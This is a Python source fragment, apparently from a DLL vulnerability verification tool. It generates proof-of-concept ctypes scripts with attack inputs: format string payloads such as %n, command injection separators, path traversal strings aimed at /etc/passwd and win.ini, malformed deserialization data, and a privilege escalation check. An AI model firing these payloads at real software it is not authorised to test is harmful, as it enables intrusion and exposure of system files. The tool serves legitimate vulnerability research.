            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-191: Integer Underflow
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_int32]
    func.restype = ctypes.c_int

    # Integer underflow test values
    test_values = [
        (0, "Zero"),
        (-1, "Negative one"),
        (-0x80000000, "INT32_MIN"),
        (-0x7FFFFFFF - 1, "INT32_MIN via subtraction"),
    ]

    for val, desc in test_values:
        print(f"[*] Testing with {{desc}}: {{val}}")
        try:
            result = func(val)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'FORMAT_STRING':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-134: Use of Externally-Controlled Format String
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_char_p]
    func.restype = ctypes.c_int

    # Format string payloads
    payloads = [
        b"%x.%x.%x.%x",           # Read stack values
        b"%s%s%s%s",              # Crash via string read
        b"%n%n%n%n",              # Write to memory (dangerous!)
        b"AAAA%08x.%08x.%08x",    # Leak with marker
        b"%p.%p.%p.%p",           # Pointer leak
    ]

    print("[*] Format string exploitation tests:")
    for payload in payloads:
        print(f"    Testing: {{payload[:30]}}...")
        try:
            result = func(payload)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'COMMAND_INJECTION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-78: OS Command Injection
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_char_p]
    func.restype = ctypes.c_int

    # Safe command injection test payloads
    # These use harmless commands for testing
    payloads = [
        b"test; echo VULN",       # Unix-style command separator
        b"test| echo VULN",       # Pipe
        b"test& echo VULN",       # Background execution
        b"test`echo VULN`",       # Command substitution
        b"test$(echo VULN)",      # Command substitution
        b"test && echo VULN",     # Conditional execution
    ]

    print("[*] Command injection tests (safe payloads):")
    for payload in payloads:
        print(f"    Testing: {{payload}}...")
        try:
            result = func(payload)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'PATH_TRAVERSAL':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-22: Path Traversal
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_char_p]
    func.restype = ctypes.c_int

    # Path traversal payloads
    payloads = [
        b"..\\\\..\\\\..\\\\..\\\\windows\\\\system.ini",
        b"../../../../etc/passwd",
        b"..%5c..%5c..%5cwindows%5csystem.ini",
        b"..%2f..%2f..%2fetc%2fpasswd",
        b"....//....//....//etc/passwd",
        b"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini",
    ]

    print("[*] Path traversal tests:")
    for payload in payloads:
        print(f"    Testing: {{payload[:40]}}...")
        try:
            result = func(payload)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'INFO_DISCLOSURE':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-200: Information Exposure
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p, ctypes.c_int]
    func.restype = ctypes.c_int

    # Allocate output buffer
    out_buf = ctypes.create_string_buffer(4096)

    print("[*] Calling function with output buffer...")
    try:
        result = func(out_buf, 4096)
        print(f"[*] Returned: {{result}}")

        # Check for leaked data
        data = out_buf.raw
        non_zero = [b for b in data if b != 0]
        if non_zero:
            print(f"[!] Data returned: {{len(non_zero)}} non-zero bytes")
            print(f"    First 64 bytes: {{data[:64].hex()}}")
        else:
            print("[*] No data returned")
    except Exception as e:
        print(f"[!] Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'MEMORY_LEAK':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-401: Missing Release of Memory after Effective Lifetime
"""
import ctypes
import psutil
import os

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = []
    func.restype = ctypes.c_int

    process = psutil.Process(os.getpid())

    print("[*] Memory leak detection test")
    print(f"[*] Initial memory: {{process.memory_info().rss / 1024 / 1024:.2f}} MB")

    # Call function multiple times
    iterations = 1000
    for i in range(iterations):
        try:
            func()
        except:
            pass

        if i % 100 == 0:
            mem = process.memory_info().rss / 1024 / 1024
            print(f"    Iteration {{i}}: {{mem:.2f}} MB")

    final_mem = process.memory_info().rss / 1024 / 1024
    print(f"[*] Final memory: {{final_mem:.2f}} MB")
    print(f"[*] Memory growth indicates potential leak")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'RACE_CONDITION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-362: Race Condition
"""
import ctypes
import threading
import time

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p]
    func.restype = ctypes.c_int

    # Shared resource
    shared_buf = ctypes.create_string_buffer(256)
    race_detected = [False]
    error_count = [0]

    def racer(thread_id):
        for i in range(100):
            try:
                # Write thread-specific pattern
                pattern = bytes([thread_id] * 256)
                ctypes.memmove(shared_buf, pattern, 256)

                # Call function with shared buffer
                func(shared_buf)

                # Check if pattern was corrupted
                data = shared_buf.raw
                if data != pattern and data != bytes([0] * 256):
                    race_detected[0] = True
            except Exception as e:
                error_count[0] += 1

    print("[*] Race condition test with multiple threads")
    threads = []
    for i in range(4):
        t = threading.Thread(target=racer, args=(i + 0x41,))
        threads.append(t)

    for t in threads:
        t.start()

    for t in threads:
        t.join()

    print(f"[*] Errors: {{error_count[0]}}")
    if race_detected[0]:
        print("[!] RACE CONDITION DETECTED!")
    else:
        print("[*] No obvious race detected (may need more iterations)")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'STACK_EXHAUSTION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-674: Uncontrolled Recursion / Stack Exhaustion
"""
import ctypes
import sys

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_int]
    func.restype = ctypes.c_int

    # Test with large recursion depth
    depths = [100, 1000, 10000, 100000]

    print("[*] Stack exhaustion test")
    for depth in depths:
        print(f"[*] Testing with depth {{depth}}...")
        try:
            result = func(depth)
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception (stack overflow?): {{e}}")
            break

    # Also test with large stack allocation
    print("[*] Testing with large local buffer...")
    large_buf = ctypes.create_string_buffer(1024 * 1024)  # 1MB
    try:
        result = func(ctypes.cast(large_buf, ctypes.c_int).value)
    except Exception as e:
        print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'DESERIALIZATION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-502: Deserialization of Untrusted Data
"""
import ctypes
import struct

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    func.argtypes = [ctypes.c_void_p, ctypes.c_int]
    func.restype = ctypes.c_int

    # Craft malicious serialized data
    # This is a generic template - adjust based on actual format

    # Common serialization attack patterns
    payloads = []

    # Pattern 1: Type confusion via class ID
    payload1 = struct.pack('<I', 0xDEADBEEF)  # Fake class ID
    payload1 += struct.pack('<I', 0x1000)     # Large size
    payload1 += b'A' * 256                     # Payload data
    payloads.append((payload1, "Fake class ID"))

    # Pattern 2: Negative size
    payload2 = struct.pack('<I', 1)           # Valid class ID
    payload2 += struct.pack('<i', -1)         # Negative size
    payload2 += b'B' * 64
    payloads.append((payload2, "Negative size"))

    # Pattern 3: Oversized length
    payload3 = struct.pack('<I', 1)
    payload3 += struct.pack('<I', 0x7FFFFFFF) # Huge size
    payload3 += b'C' * 64
    payloads.append((payload3, "Oversized length"))

    print("[*] Deserialization attack tests")
    for payload, desc in payloads:
        buf = ctypes.create_string_buffer(payload)
        print(f"[*] Testing: {{desc}}...")
        try:
            result = func(buf, len(payload))
            print(f"    Returned: {{result}}")
        except Exception as e:
            print(f"    Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        elif event.vuln_type == 'PRIVILEGE_ESCALATION':
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target Function: {func_name} @ 0x{event.address:x}
CWE-269: Improper Privilege Management
"""
import ctypes
from ctypes import wintypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

# Windows privilege constants
SE_DEBUG_PRIVILEGE = 20
SE_TAKE_OWNERSHIP_PRIVILEGE = 9
SE_SECURITY_PRIVILEGE = 8

if func:
    print("[*] Privilege escalation test")

    # Check current privileges
    advapi32 = ctypes.WinDLL("advapi32")
    kernel32 = ctypes.WinDLL("kernel32")

    token = wintypes.HANDLE()
    kernel32.OpenProcessToken(
        kernel32.GetCurrentProcess(),
        0x0020,  # TOKEN_ADJUST_PRIVILEGES
        ctypes.byref(token)
    )

    print(f"[*] Current process token: 0x{{token.value:x}}")

    # Attempt to call the vulnerable function
    print(f"[*] Calling {{0}} to check for privilege escalation...")
    try:
        result = func()
        print(f"[*] Returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception: {{e}}")

    print("[*] Manually verify if privileges were elevated")
    print("[*] Check with: whoami /priv")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
'''

        else:
            poc = f'''"""
PoC for {event.vuln_type} in {dll_name}
Target: 0x{event.address:x}
Note: Generic template - manual adjustment required
"""
import ctypes

dll_path = r"{self.binary_path}"
dll = ctypes.WinDLL(dll_path)

# Get function by name (if exported)
try:
    func = getattr(dll, "{func_name}", None)
except:
    func = None

if func:
    print(f"[*] Testing {event.vuln_type}...")
    try:
        # Adjust arguments based on actual function signature
        result = func()
        print(f"[*] Function returned: {{result}}")
    except Exception as e:
        print(f"[!] Exception: {{e}}")
else:
    print("[!] Function {func_name} not found as export")
    print("[*] Use debugger to analyze 0x{event.address:x}")
    print("[*] This vulnerability type requires manual PoC development")
'''

        return poc

    def verify_finding(self, finding: Dict) -> VerifyResult:
        """Verify a LuoDllHack finding"""
        address = finding.get('address', finding.get('location', 0))
        vuln_type = finding.get('vuln_type', 'UNKNOWN')
        func_name = finding.get('func_name', '')

        if hasattr(vuln_type, 'name'):
            vuln_type = vuln_type.name

        return self.verify(address, str(vuln_type).upper(), func_name)


def check_availability():
    """Check if Speakeasy verifier is available"""
    if not HAVE_SPEAKEASY:
        print("[!] Speakeasy not available")
        print("    Install: pip install speakeasy-emulator")
        return False

    print("[+] Speakeasy verifier available")
    return True


if __name__ == "__main__":
    check_availability()
